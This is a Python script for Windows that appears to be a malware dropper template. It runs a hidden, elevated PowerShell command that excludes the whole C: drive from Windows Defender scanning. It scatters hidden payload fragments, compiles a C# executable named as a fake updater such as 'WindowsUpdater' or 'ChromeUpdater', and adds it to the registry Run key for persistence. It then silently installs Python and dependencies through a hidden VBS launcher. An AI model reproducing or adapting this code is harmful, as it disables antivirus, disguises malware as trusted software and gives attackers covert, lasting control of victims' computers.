# -*- coding: utf-8 -*-
import os
import random
import subprocess
import win32api
import win32con
import winreg

def writefile(path, data):
    with open(path, 'w', encoding='UTF-8') as f:
        f.write(data)

def readfile(path):
    with open(path, 'r', encoding='UTF-8') as f:
        data = f.read()
    return data

def make_hidden(file_path):
    try:
        win32api.SetFileAttributes(file_path, win32con.FILE_ATTRIBUTE_HIDDEN)
    except:
        pass

def generate_path(base_path, name_length=5):
    random_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', k=name_length))
    return os.path.join(base_path, random_name + '.log')

def dav():
    try:
        command = 'Set-MpPreference -ExclusionPath c:\\'
        subprocess.run(['powershell', '-Command', f'Start-Process powershell -Verb runAs -ArgumentList "-Command {command}" -WindowStyle Hidden'], capture_output=False, text=False)
    except:
        pass

src_hashed = 'SRC_HASHED'
recompyler = r"""'RECOMPYLER'"""
possible_paths = [
    os.path.join(os.getenv('ProgramData')),
    os.getenv('TEMP'),
    os.getenv('APPDATA'),
    os.getenv('LOCALAPPDATA'),
    os.getenv('USERPROFILE')]

created_name = random.choice([
    'PCHealthCheck',
    'WindowsUpdater',
    'MSEdgeUpdater',
    'ChromeUpdater',
    'GoogleCrashHandler',
    'JavaUpdateChecker',
    'WindowsStore'])

selected_paths = [
    generate_path(random.choice(possible_paths)) for _ in src_hashed]

for path, char in zip(selected_paths, src_hashed):
    writefile(path, char + "\n")
    make_hidden(path)

dav()
selected_paths = [s.replace('\\', '\\\\') for s in selected_paths]
recompyler_content = recompyler.replace('PARTS_PATH', '","'.join(selected_paths))
created_file = os.path.join(os.getenv('TEMP'), f"{created_name}.cs")
writefile(created_file, recompyler_content)
csc_path = os.path.join(os.getenv("SystemRoot"), 'Microsoft.NET\\Framework\\v4.0.30319', 'csc.exe')
exe_path = random.choice(possible_paths)
exe_file = f'{exe_path}\\{created_name}.exe'
command_args = [
    csc_path,
    f'/out:{exe_file}',
    created_file,
]
command_str = " ".join(command_args)
devnull = open(os.devnull, 'w')
os.system("{} > {} 2>&1".format(command_str, os.devnull))
devnull.close()
make_hidden(exe_file)

key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
winreg.SetValueEx(key, created_name, 0, winreg.REG_SZ, exe_file)
os.remove(created_file)

pip_path = os.path.join(os.getenv('TEMP'), 'pip.txt')
temporary_script_path = os.path.join(os.getenv('TEMP'), 'temporary.cmd')
temporary_script_launcher_path = os.path.join(os.getenv('TEMP'), 'launch.vbs')
if os.getenv('USERNAME') in exe_file:
    exe_file = exe_file.replace(os.getenv('USERNAME'), "%USERNAME%") 

pip = r"""'PIPREQUIREMENTS'"""
temporary_script = u'''set "PYTHON_EXE=python-installer.exe"
set "PYTHON_TEMP=%TEMP%\%PYTHON_EXE%"
for /f "tokens=1,2 delims= " %%a in ('powershell -Command "Invoke-WebRequest https://www.python.org/ftp/python/ -UseBasicParsing | Select-String -Pattern '3.10.[0-9]{1,2}' -AllMatches | Select-Object -ExpandProperty Matches | Select-Object -ExpandProperty Value | Sort-Object -Descending -Unique | Select-Object -First 1"') do (
    set "PYTHON_VERSION=%%a%%b"
)
set "PYTHON_URL=https://www.python.org/ftp/python/%PYTHON_VERSION%/python-%PYTHON_VERSION%-amd64.exe"
curl -L -o "%PYTHON_TEMP%" "%PYTHON_URL%"
start /wait "" "%PYTHON_TEMP%" /passive /norestart TARGETDIR=C:\Python310 ALLUSERS=1 PrependPath=1 Include_test=0 Include_pip=1 Include_doc=0 /qn /quiet /norestart
taskkill /f /im "%PYTHON_EXE%"
del "%PYTHON_TEMP%"
pip install -r "%TEMP%/pip.txt"
"{FILEPATH}"'''.replace('{FILEPATH}', exe_file)
vbs_script = r"""Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "cmd /c start /b {temporary_script_path}", 0, False""".replace("{temporary_script_path}", temporary_script_path)


if os.path.exists(pip_path): 
    os.remove(pip_path)
if os.path.exists(temporary_script_launcher_path):
    os.remove(temporary_script_launcher_path)
try:
    os.remove(temporary_script_path)
except: pass

writefile(temporary_script_launcher_path, vbs_script)
make_hidden(temporary_script_launcher_path)
writefile(pip_path, pip)
make_hidden(pip_path)
writefile(temporary_script_path , temporary_script)
make_hidden(temporary_script_path)

subprocess.call(["cscript.exe", "//nologo", temporary_script_launcher_path])
